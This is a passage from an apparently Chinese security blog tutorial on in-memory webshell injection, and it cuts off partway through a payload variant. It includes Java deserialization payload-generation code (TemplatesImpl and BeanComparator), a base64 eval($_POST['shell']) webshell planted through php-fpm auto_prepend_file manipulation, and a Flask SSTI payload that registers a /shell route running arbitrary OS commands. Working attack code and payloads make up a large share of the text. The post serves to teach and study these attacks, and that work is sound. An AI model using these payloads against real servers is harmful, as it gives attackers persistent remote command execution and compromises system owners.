TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以下是生成字节码和生成序列化payload的Test代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.vul_demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getpayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(EvilTemplatesImpl.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> queue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@org</span>.junit.jupiter.api.Test</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">payload</span> <span class="operator">=</span> getpayload();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        outputStream.writeObject(payload);</span><br><span class="line">        outputStream.flush();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">codes</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">        System.out.println(codes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@org</span>.junit.jupiter.api.Test</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test2</span><span class="params">()</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = ClassPool.getDefault().get(EvilController.class.getName()).toBytecode();</span><br><span class="line">        System.out.println(Arrays.toString(bytes).replace(<span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>).replace(<span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以下是执行结果，传入payload：</p><p><a href="https://pic.imgdb.cn/item/64d270e21ddac507cc0cc025.jpg" title="image-20230808011049632" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d270e21ddac507cc0cc025.jpg" alt="image-20230808011049632"></a></p><p>之后进入&#x2F;shell，成功注入：</p><p><a href="https://pic.imgdb.cn/item/64d270f31ddac507cc0ce8bc.jpg" title="image-20230808011106412" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d270f31ddac507cc0ce8bc.jpg" alt="image-20230808011106412"></a></p><h2 id="PHP-内存马"><a href="#PHP-内存马" class="headerlink" title="PHP 内存马"></a>PHP 内存马</h2><h3 id="注入方法："><a href="#注入方法：" class="headerlink" title="注入方法："></a>注入方法：</h3><p>目前PHP仍然是非常主流的服务端Web语言，只是网上很多文章还是更关注Java内存马，对PHP内存马的了解似乎只停留在PHP不死马。而PHP不死马一般存在文件落地不说，还非常容易被管理员发现，因此实在无法将它定义为内存马。</p><p>那我们怎样做不需要落地PHP文件就可以将我们的Webshell注入进服务器呢？其实方法很简单，还记得PHP有一个配置叫做auto_prepend_file吗？auto_prepend_file配置指定在主文件之前自动解析的文件名。假设此时我们拥有一个PHP网站的RCE漏洞，那么我们只需要修改auto_prepend_file的值为<code>data:;base64,PD9waHAgQGV2YWwoJF9QT1NUWydzaGVsbCddKTsgPz4=</code>，接下来当我们每次访问别的PHP文件时都会自动解析<code>&lt;?php @eval($_POST[&#39;shell&#39;]); ?&gt;</code>，然后就是传入shell参数进行RCE了。那假如我们没有RCE是不是就不行？其实不然，在某些情况可能我们只需要一个SSRF或者php-fpm未授权就可以完成PHP内存马的注入。</p><p>要了解这种注入手法，首先就要了解php-fpm是做什么的。php解释器和webserver进行通信时使用cgi协议，但是由于其每次都要开关进程，非常浪费资源，于是出现了fastcgi，利用一个进程一次处理多个请求。而php-fpm（php-Fastcgi Process Manager）就是fastcgi的实现，并提供了进程管理的功能。</p><p>以下是借用别的师傅的一张图：</p><p><a href="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/image-20220923120208667.png" title="image" class="gallery-item"><img src="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/image-20220923120208667.png" alt="image"></a></p><p>可以看到Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给php-fpm，FPM按照fastcgi的协议将TCP流解析成真正的数据。</p><p>举个例子，用户访问<a href="http://127.0.0.1/index.php?a=1&b=2">http://127.0.0.1/index.php?a=1&b=2</a>，如果web目录是&#x2F;var&#x2F;www&#x2F;html，那么Nginx会将这个请求变成如下key-value对：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,</span><br><span class="line">    &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;,</span><br><span class="line">    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,</span><br><span class="line">    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,</span><br><span class="line">    &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;,</span><br><span class="line">    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;,</span><br><span class="line">    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,</span><br><span class="line">    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,</span><br><span class="line">    &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;REMOTE_PORT&#x27;: &#x27;12345&#x27;,</span><br><span class="line">    &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,</span><br><span class="line">    &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;,</span><br><span class="line">    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个数组其实就是PHP中$_SERVER数组的一部分，也就是PHP里的环境变量。PHP-FPM拿到fastcgi的数据包后，进行解析，得到上述这些环境变量。然后，执行SCRIPT_FILENAME的值指向的PHP文件，也就是&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php。在PHP-FPM中有两个特殊的环境变量，PHP_VALUE和PHP_ADMIN_VALUE。这两个环境变量就是用来设置PHP配置项的，PHP_VALUE可以设置模式为PHP_INI_USER和PHP_INI_ALL的选项，PHP_ADMIN_VALUE可以设置所有选项。（disable_functions除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中）</p><p>php-fpm默认监听9000端口，假设我们可以跳过nginx直接与php-fpm进行通信，那我们是不是就可以伪造fastcgi协议数据包从而改变PHP里的配置项，例如我们之前提到的auto_prepend_file。</p><p>构造如下环境变量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,</span><br><span class="line">    &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;,</span><br><span class="line">    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,</span><br><span class="line">    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,</span><br><span class="line">    &#x27;QUERY_STRING&#x27;: &#x27;?x=x&#x27;,</span><br><span class="line">    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?x=x&#x27;,</span><br><span class="line">    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,</span><br><span class="line">    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,</span><br><span class="line">    &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;REMOTE_PORT&#x27;: &#x27;12345&#x27;,</span><br><span class="line">    &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,</span><br><span class="line">    &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;,</span><br><span class="line">    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;</span><br><span class="line">    &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = &quot;data:;base64,PD9waHAgQGV2YWwoJF9QT1NUWydzaGVsbCddKTsgPz4=&quot;&#x27;,</span><br><span class="line">    &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着自己改改p牛的脚本运行就注入成功了：<a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p><h2 id="Python-Flask-内存马"><a href="#Python-Flask-内存马" class="headerlink" title="Python Flask 内存马"></a>Python Flask 内存马</h2><p>Flask&#x2F;jinja2 SSTI漏洞过于基础就不再介绍了，直接给出漏洞环境：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    person = <span class="string">&#x27;guest&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">        person = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    template = <span class="string">&#x27;&lt;h2&gt;Hello %s!&lt;/h2&gt;&#x27;</span> % person</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>flask版本为2.0.3：</p><p><a href="https://pic.imgdb.cn/item/64d2714f1ddac507cc0dc856.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d2714f1ddac507cc0dc856.jpg"></a></p><h3 id="注入流程分析"><a href="#注入流程分析" class="headerlink" title="注入流程分析"></a>注入流程分析</h3><p>首先我们先看一下payload ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](</span><br><span class="line">    <span class="string">&quot;app.add_url_rule(</span></span><br><span class="line"><span class="string">        &#x27;/shell&#x27;, </span></span><br><span class="line"><span class="string">        &#x27;shell&#x27;, </span></span><br><span class="line"><span class="string">        lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span></span><br><span class="line"><span class="string">    )&quot;</span>,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>url_for是Flask的一个内置函数, 通过Flask内置函数可以调用其<code>__globals__</code>属性, 该特殊属性能够返回函数所在模块命名空间的所有变量, 其中包含了很多已经引入的modules，比如<code>__builtins__</code>模块。在<code>__builtins__</code>模块中, <code>Python</code>在启动时就直接为我们导入了很多内建函数，如eval，exec等。让我们看一下python中eval函数是怎样使用的：</p><p><a href="https://pic.imgdb.cn/item/64d271011ddac507cc0d09d9.jpg" title="image-20230808234956583" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d271011ddac507cc0d09d9.jpg" alt="image-20230808234956583"></a></p><p>给出以下例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">namespace = &#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">3</span>&#125;</span><br><span class="line">result = <span class="built_in">eval</span>(<span class="string">&quot;a + b&quot;</span>, namespace)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>可以看到，eval函数是在指定命名空间中执行表达式，a+b即2+3。</p><p>那在给出的payload中，以下为表达式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">app.add_url_rule(</span><br><span class="line">    <span class="string">&#x27;/shell&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;shell&#x27;</span>, </span><br><span class="line">    <span class="keyword">lambda</span> :<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(_request_ctx_stack.top.request.args.get(<span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;whoami&#x27;</span>)).read()</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>以下代码即是我们制定的命名空间：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>current_app</code>是一个本地代理，它的类型是<code>werkzeug.local.LocalProxy</code>，它所代理的即是我们的<code>app</code>对象：</p><p><a href="https://pic.imgdb.cn/item/64d2710e1ddac507cc0d283f.jpg" title="image-20230808185151749" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d2710e1ddac507cc0d283f.jpg" alt="image-20230808185151749"></a></p><p>只在请求线程内存在，它的生命周期就是在应用上下文里。离开了应用上下文，<code>current_app</code>一样无法使用。</p><p>当一个网页请求来以后，Flask会实例化对象app，执行<code>__call__</code>：</p><p><a href="https://pic.imgdb.cn/item/64d271191ddac507cc0d41f8.jpg" title="image-20230808222142861" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d271191ddac507cc0d41f8.jpg" alt="image-20230808222142861"></a></p><p>之后调用<code>flask.app.Flask.wsgi_app</code>：</p><p><a href="https://pic.imgdb.cn/item/64d271641ddac507cc0df993.jpg" title="image-20230808223208880" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d271641ddac507cc0df993.jpg" alt="image-20230808223208880"></a></p><p>此处调用了<code>flask.app.Flask.request_context</code>创建一个请求上下文<code>RequestContext</code>类型的对象，：</p><p><a href="https://pic.imgdb.cn/item/64d2716e1ddac507cc0e17a9.jpg" title="image-20230808223251476" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d2716e1ddac507cc0e17a9.jpg" alt="image-20230808223251476"></a></p><p>其需接收<code>werkzeug</code>中的<code>environ</code>对象为参数。<code>werkzeug</code>是Flask所依赖的WSGI函数库。接下来又调用了push()方法：</p><p><a href="https://pic.imgdb.cn/item/64d271771ddac507cc0e2f93.jpg" title="image-20230808223402158" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d271771ddac507cc0e2f93.jpg" alt="image-20230808223402158"></a></p><p>这是为什么？<code>request_context</code>方法已经创建了请求上下文，为什么还要调用<code>push</code>和<code>pop</code>方法呢？这就是Flask关于上下文实现的关键了。对于Flask Web应用来说，每个请求就是一个独立的线程。请求之间的信息要完全隔离，避免冲突，这就需要使用本地线程环境(ThreadLocal)，这个概念在其他语言如Java中也有。<code>ctx.push()</code>方法，会将当前请求上下文，压入<code>flask._request_ctx_stack</code>的栈中，这个<code>_request_ctx_stack</code>是内部对象。同时这个<code>_request_ctx_stack</code>栈是个ThreadLocal对象。也就是<code>flask._request_ctx_stack</code>看似全局对象，其实每个线程的都不一样。请求上下文压入栈后，再次访问其都会从这个栈的顶端通过<code>_request_ctx_stack.top</code>来获取，所以取到的永远是只属于本线程中的对象，这样不同请求之间的上下文就做到了完全隔离。请求结束后，线程退出，ThreadLocal线程本地变量也随即销毁，<code>ctx.pop()</code>用来将请求上下文从栈里弹出，避免内存无法回收。</p><p>知道了app和_request_ctx_stack是什么，我们就来看看eval中的表达式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">app.add_url_rule(</span><br><span class="line">    <span class="string">&#x27;/shell&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;shell&#x27;</span>, </span><br><span class="line">    <span class="keyword">lambda</span> :<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(_request_ctx_stack.top.request.args.get(<span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;whoami&#x27;</span>)).read()</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>跟进装饰器<code>@app.route(&#39;&lt;url&gt;&#39;)</code>的代码，可以看到其本质上也调用了flask对象的add_url_rule()方法：</p><p><a href="https://pic.imgdb.cn/item/64d271871ddac507cc0e53d3.jpg" title="image-20230808224327817" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d271871ddac507cc0e53d3.jpg" alt="image-20230808224327817"></a></p><p>以下是一个不使用装饰器创建路由的示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"></span><br><span class="line">app.add_url_rule(<span class="string">&#x27;/index&#x27;</span>,endpoint=<span class="string">&#x27;index&#x27;</span>,view_func=index)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以下是这三个参数的解释：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">:param rule: The URL rule string.</span><br><span class="line">:param endpoint: The endpoint name to associate with the rule</span><br><span class="line">    and view function. Used when routing and building URLs.</span><br><span class="line">    Defaults to ``view_func.__name__``.</span><br><span class="line">:param view_func: The view function to associate with the</span><br><span class="line">    endpoint name.</span><br></pre></td></tr></table></figure><p>因此payload中add_url_rule()方法的每一个参数的意思也就知道了，主要看payload中的第三个参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span><br></pre></td></tr></table></figure><p>通过<strong>import</strong>模块导入os并执行os.popen(cmd).read()。<code>_request_ctx_stack.top</code>拿到<code>_request_ctx_stack</code>的栈顶元素，即当前请求上下文，之后从当前请求上下文获取request对象，通过request.args.get()的方法拿到cmd参数的值，如果cmd参数为空，就设为whoami。也就是说默认执行whoami。</p><h3 id="payload变形"><a href="#payload变形" class="headerlink" title="payload变形"></a>payload变形</h3><p>至此，整个payload的脉络也梳理清楚了。那仔细想想还有什么办法对这个payload进行一些改变呢？以request对象为例，刚刚提到，在payload中，获取request对象是通过从全局变量中获取_request_ctx_stack，并获取它的栈顶元素及请求上下文，而请求上下文的request属性即是我们的需要的request对象。但在我们其实可以在<code>url_for.__globals__</code>就找到此次请求的request对象，而不用通过这种方式来获取：</p><p><a href="https://pic.imgdb.cn/item/64d271941ddac507cc0e727e.jpg" title="image-20230808235310632" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d271941ddac507cc0e727e.jpg" alt="image-20230808235310632"></a></p><p>因此payload可以改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;, 